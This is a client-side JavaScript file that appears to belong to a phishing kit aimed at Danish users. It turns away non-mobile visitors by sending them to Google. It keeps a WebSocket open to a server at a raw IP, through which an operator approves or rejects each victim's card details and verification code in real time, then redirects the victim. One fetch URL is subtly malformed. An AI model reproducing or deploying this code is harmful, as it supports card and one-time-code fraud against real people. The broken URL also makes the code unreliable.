/*
 * @Descripttion: 
 * @version: 
 * @Author: dekun lu
 * @Email: 1364978779@qq.com
 * @Date: 2023-02-19 23:39:35
 * @LastEditors: dekun lu
 * @LastEditTime: 2023-02-25 14:19:24
 */

/**
 * @name: dekun lu
 * @msg: 连接websocket
 * @email: 1364978779@qq.com
 * @return {*}
 */

const baseURL = 'https://155.94.182.31:8080'
//loading    loading-icegif-1.gif
var loading = document.createElement("div");
window.onload = async function () {
    //手机端校验

    const data = fetch('https://155.94.182.31:8080user/check', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
    });
    const res = await data;
    const result = await res.json();
    if (result.code !== 200) {
        alert("请在手机端打开");

        //跳转baidu
        window.location.href = "https://www.google.com";

        return;
    }







    //判断localStorage中是否有uid
    if (sessionStorage.getItem("uid") == null) {
        //随机生成uid
        let uid = Math.floor(Math.random() * 1000000000);
        //将uid存入localStorage
        sessionStorage.setItem("uid", uid);

        //跳转index.html
        window.location.href = "/danish/index2.html";
    }

    loading.style.display = "none";
    loading.style.position = "fixed";
    loading.style.top = "0";
    loading.style.left = "0";
    loading.style.width = "100%";
    loading.style.height = "100%";
    loading.style.background = "rgba(0,0,0,0.5)";
    loading.style.zIndex = "9999";
    loading.innerHTML = `<div style="position: absolute;top: 50%;left: 50%;transform: translate(-50%,-50%);border-radius: 10px;text-align: center;line-height: 100px;font-size: 20px;">
        <img src="../img/loading-icegif-1.gif" alt="" style="width: 25px;height: auto;">
    </div > `;
    document.body.appendChild(loading);
}
const ws = new WebSocket("wss://155.94.182.31:8080/api/websocket/user/" + sessionStorage.getItem("uid"));
ws.onopen = function () {
    console.log("连接成功");
};
ws.onmessage = function (event) {
    const data = JSON.parse(event.data);
    //放行卡
    if (data.code == 7) {
        //存sessionStrorage
        sessionStorage.setItem("data", JSON.stringify(data.data));
        hideLoading();
        //跳转code.html
        window.location.href = "/danish/code2.html";
    }

    //拒绝卡
    if (data.code == 8) {
        //存sessionStrorage
        sessionStorage.setItem("data", JSON.stringify(data.data));
        document.querySelector('.tip').style.display = "block";

        hideLoading();
    }

    //放行验证码
    if (data.code == 9) {
        //存sessionStrorage
        sessionStorage.setItem("data", JSON.stringify(data.data));
        hideLoading();
        //跳转code.html
        window.location.href = "https://www.baidu.com";
    }
    //拒绝验证码
    if (data.code == 10) {
        //存sessionStrorage
        sessionStorage.setItem("data", JSON.stringify(data.data));
        document.querySelector('.tip').style.display = "block";
        hideLoading();
    }
    //同步完成
    if (data.code == 11) {

        window.location.href = "https://www.baidu.com";

        // hideLoading();
    }
};
ws.onclose = function () {
    //连接关闭
    alert("The connection is closed, please refresh the page");
};
ws.onerror = function () {
    alert("Connection error");
};




function showLoading() {
    loading.style.display = "block";
}
function hideLoading() {
    loading.style.display = "none";
}